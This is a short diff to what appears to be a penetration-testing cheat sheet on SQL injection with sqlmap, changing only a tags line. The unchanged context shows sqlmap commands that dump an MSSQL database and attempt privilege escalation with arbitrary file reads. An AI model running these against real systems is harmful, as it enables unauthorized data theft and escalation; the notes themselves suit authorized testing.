@@ -91,4 +91,4 @@ sqlmap -d 'mssql://<user>:<pass>@<ip>:1433/<dbname>' --dump
 sqlmap -d 'mssql://<domain>\<user>:<pass>@<ip>:1433/volume' --priv-esc --file-read='<full path>'
 ```
 
-tags: sql injection sqlmap tamper
+tags: #sql #injection #sqlmap #tamper 
